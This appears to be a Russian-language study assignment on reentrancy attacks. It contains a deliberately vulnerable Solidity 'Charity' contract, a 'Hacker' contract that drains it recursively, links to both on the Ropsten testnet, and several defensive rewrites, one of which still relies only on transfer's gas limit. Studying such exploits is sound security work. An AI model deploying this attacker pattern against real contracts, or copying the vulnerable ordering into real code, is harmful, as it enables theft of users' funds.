Изучить Reentrancy атаки, DAO Hack.
Кратко комментарием прописать основной смысл атаки и способ ее реализации.
Написать контракты, реализующие эту уязвимость. 

Основной смысл: списание средств со счета с помощью рекурсии.
Реализация: для атаки нужно, чтобы на контракте-жертве переменная/переменные,
важные для доступа к функции, обновлялись после call(). Тогда можно реализовать атаку. 
Необходимо создать контракт с функцией fallback() payable/receive(), 
которая будет вызывать функцию получения эфиров на контракте-жертве при переводе эфиров 
(с контракта-жертвы) на контракт хакера. 
Функция получения эфиров не будет сразу же доходить до обновления "важной" переменной 
за счет рекурсии.

Charity - https://ropsten.etherscan.io/address/0x7882dB4baBF0d88b9C7A5dB130F3b4CC58C49B40#code
Hacker - https://ropsten.etherscan.io/address/0xDFB61CbA7953E2Ce1fDF3f014b54222D7df57b0C#code


pragma solidity ^0.8.6;

contract Charity {
    mapping(address => bool) private caller;
    
    receive() external payable {
    }
    
    ///всем можно взять по 2 эфира
    function getEther() external {  
        if (!caller[msg.sender]) {   
            (bool success, ) = payable(msg.sender).call{value: 2 ether}("");  
            require(success, "Failed to transfer 1 Ether");
        }
        caller[msg.sender] = true;
    }
    
    function canReceiveEther() public view returns (bool) {
        return !caller[msg.sender];
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Hacker {
    address payable private owner;
    Charity private victim;

    constructor(address payable _victim) {
        victim = Charity(_victim);
        owner = payable(msg.sender);
    }

    receive() external payable {
        if (address(victim).balance >= 2 ether) 
            victim.getEther();
    }
    
    function changeCharityContract(address payable _victim) public {
        victim = Charity(_victim);
    }
    
    function hack() public {
        victim.getEther();
    }
    
    function transferToOwner() public {
        return owner.transfer(address(this).balance);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


Методы защиты контракта Charity:

1.1 Лучше всего изменять важные переменные до функций call,send,transfer.
  Однако если есть transfer/send, то функция getEther() не сможет вызываться рекурсивно, 
  т.к. на transfer/send выделяется мало газа. 
  function getEther() external {  
      require(!caller[msg.sender],"Sorry, we can't transfer you another 2 ether.");
      caller[msg.sender] = true;
      payable(msg.sender).transfer(2 ether);  
  }

  function getEther() external {  
      require(!caller[msg.sender],"Sorry, we can't transfer you another 2 ether.");
      payable(msg.sender).transfer(2 ether);
      caller[msg.sender] = true;
  }

2. С помощью изменения переменной до call. Или же можно сделать call с контролем газа 
                                                         как у transfer/send.
  modifier limitReceive() {
      require(!caller[msg.sender],"Sorry, we can't transfer you another 2 ether.");
      _;
  }
  function getEther() external limitReceive {  
      caller[msg.sender] = true;
      (bool success, ) = payable(msg.sender).call{value: 2 ether}("");  
      require(success,"Failed to transfer 1 Ether"); 
  }

3. С универсальным модификатором из библиотеки.
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol';
contract Charity is ReentrancyGuard {
    ...
    function getEther() external nonReentrant {  
        if (!caller[msg.sender]){
            (bool success, ) = payable(msg.sender).call{value: 2 ether}("");
            require(success,"Failed to transfer 1 Ether");
        }
        caller[msg.sender] = true;
    }
 ...
}   